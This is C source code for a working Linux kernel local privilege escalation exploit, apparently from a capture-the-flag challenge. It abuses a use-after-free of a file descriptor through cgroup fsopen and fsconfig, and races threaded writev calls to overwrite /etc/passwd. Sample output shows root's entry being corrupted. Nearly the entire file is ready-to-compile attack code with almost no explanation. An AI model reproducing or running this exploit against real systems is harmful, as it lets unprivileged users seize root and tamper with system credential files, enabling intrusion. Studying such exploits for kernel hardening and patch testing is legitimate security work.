// gcc exp.c -o exp -no-pie -lpthread -static -Werror -Wall -O0 -s

/*
 * / $ /exp
 * [*] exp.c:134 perform initialization
 * [*] exp.c:224 trigger the vulnerability to free the fd
 * [*] exp.c:140 start slow write to get the lock
 * [*] exp.c:200 got uaf fd 4, start spray ...
 * [+] exp.c:208 found, file id 3
 * [*] exp.c:191 overwrite done! It should be after the slow write
 * [*] exp.c:175 write done!
 * [+] exp.c:270 exploit done
 * / $ cat /etc/passwd
 * AAAA:x:0:0:root:/root:/bin/sh
 * ctf:x:1000:1000:chal:/home/ctf:/bin/sh
 * / $
 */

#define _GNU_SOURCE

#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/capability.h>
#include <linux/kcmp.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

#define TEMP_WORKDIR "/tmp/exp_dir"
#define TEMP_VICTIM_FILE "victim"
#define TEMP_VICTIM_SYMLINK "uaf"

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
    syscall(__NR_fsconfig, fd, cmd, key, value, aux)
#define FSCONFIG_SET_FD 5

#define kcmp(pid1, pid2, type, idx1, idx2) \
    syscall(__NR_kcmp, pid1, pid2, type, idx1, idx2)

#define ATTACK_FILE "/etc/passwd"
char attack_data[] = {0x41, 0x41, 0x41, 0x41};

#define MAX_FILE_NUM 1000
int uaf_fd;
int fds[MAX_FILE_NUM];

pthread_spinlock_t write_mutex;
pthread_spinlock_t spray_mutex;

int run_write = 0;
int run_spray = 0;

void prepare_workdir() {
    char *cmdline;
    asprintf(&cmdline, "rm -rf %s && mkdir -p %s && touch %s/%s",
             TEMP_WORKDIR, TEMP_WORKDIR, TEMP_WORKDIR, TEMP_VICTIM_FILE);
    if (system(cmdline) != 0) {
        die("create temp workdir: %m");
    }
    if (chmod(TEMP_WORKDIR, 0777)) {
        die("chmod: %m");
    }
    if (chdir(TEMP_WORKDIR)) {
        die("chdir: %m");
    }
    free(cmdline);
}

void init_namespace() {
    int fd;
    char buff[0x100];

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
        die("unshare(CLONE_NEWUSER | CLONE_NEWNS): %m");
    }

    if (unshare(CLONE_NEWNET)) {
        die("unshare(CLONE_NEWNET): %m");
    }

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", uid);
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", gid);
    write(fd, buff, strlen(buff));
    close(fd);
}

void do_init() {
    logd("perform initialization");
    prepare_workdir();
    init_namespace();
}

void *task_slow_write(void *args) {
    logd("start slow write to get the lock");
    int fd = open(TEMP_VICTIM_SYMLINK, 1);

    if (fd < 0) {
        die("error open uaf file: %m");
    }

    unsigned long int addr = 0x30000000;
    int offset;
    for (offset = 0; offset < 0x80000; offset++) {
        if (mmap((void *)(addr + offset * 0x1000),
                 0x1000, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, 0, 0) == MAP_FAILED) {
            loge("allocate failed at 0x%x", offset);
        }
    }

    assert(offset > 0);

    void *mem = (void *)(addr);
    *(uint32_t *)mem = 0x41414141;

#define IOVEC_CNT 5
    struct iovec iov[IOVEC_CNT];
    for (int i = 0; i < IOVEC_CNT; i++) {
        iov[i].iov_base = mem;
        iov[i].iov_len = (offset - 1) * 0x1000;
    }

    pthread_spin_unlock(&write_mutex);
    // [1]：最先执行
    if (writev(fd, iov, IOVEC_CNT) < 0) {
        die("slow write: %m");
    }
#undef IOVEC_CNT
    logd("write done!");
    return NULL;
}

void *task_write_cmd(void *args) {
    struct iovec iov = {
        .iov_base = attack_data,
        .iov_len = sizeof(attack_data)};

    pthread_spin_lock(&write_mutex);
    pthread_spin_unlock(&spray_mutex);

    // [2]：会等[1]执行完再执行
    if (writev(uaf_fd, &iov, 1) < 0) {
        loge("failed to write: %m");
    }
    logd("overwrite done! It should be after the slow write");
    return NULL;
}

int spray_files() {
    pthread_spin_lock(&spray_mutex);

    // [3]：因为[2]在等[1]，所以在[2]之前执行
    int found = 0;
    logd("got uaf fd %d, start spray ...", uaf_fd);
    for (int i = 0; i < MAX_FILE_NUM; i++) {
        fds[i] = open(ATTACK_FILE, O_RDONLY);
        if (fds[i] < 0) {
            die("open file %d: %m", i);
        }
        if (kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) == 0) {
            found = 1;
            logi("found, file id %d", i);
            for (int j = 0; j < i; j++) {
                close(fds[j]);
            }
            break;
        }
    }

    if (!found) {
        return 1;
    }

    return 0;
}

void trigger() {
    logd("trigger the vulnerability to free the fd");

    symlink(TEMP_VICTIM_FILE, TEMP_VICTIM_SYMLINK);

    int fs_fd = fsopen("cgroup", 0);
    if (fs_fd < 0) {
        die("fsopen: %m");
    }

    uaf_fd = open(TEMP_VICTIM_SYMLINK, O_WRONLY);
    if (uaf_fd < 0) {
        die("failed to open symbolic file: %m");
    }
    /*
     * fsconfig_set_fd: An open file descriptor is specified.  @_value must be
     * NULL and @aux indicates the file descriptor.
     */
    if (fsconfig(fs_fd, FSCONFIG_SET_FD, "source", NULL, uaf_fd)) {
        die("fsopen: %m");
    }

    // free the uaf fd
    close(fs_fd);
}

int main(void) {
    do_init();
    trigger();

    pthread_t p1, p2;
    pthread_spin_init(&write_mutex, 0);
    pthread_spin_init(&spray_mutex, 0);
    pthread_spin_lock(&write_mutex);
    pthread_spin_lock(&spray_mutex);
    pthread_create(&p1, NULL, task_slow_write, NULL);
    pthread_create(&p2, NULL, task_write_cmd, NULL);
    int not_success = spray_files();
    pthread_join(p1, NULL);
    pthread_join(p2, NULL);
    pthread_spin_destroy(&spray_mutex);
    pthread_spin_destroy(&write_mutex);

    if (not_success) {
        die("failed");
    }

    logi("exploit done");

    return 0;
}
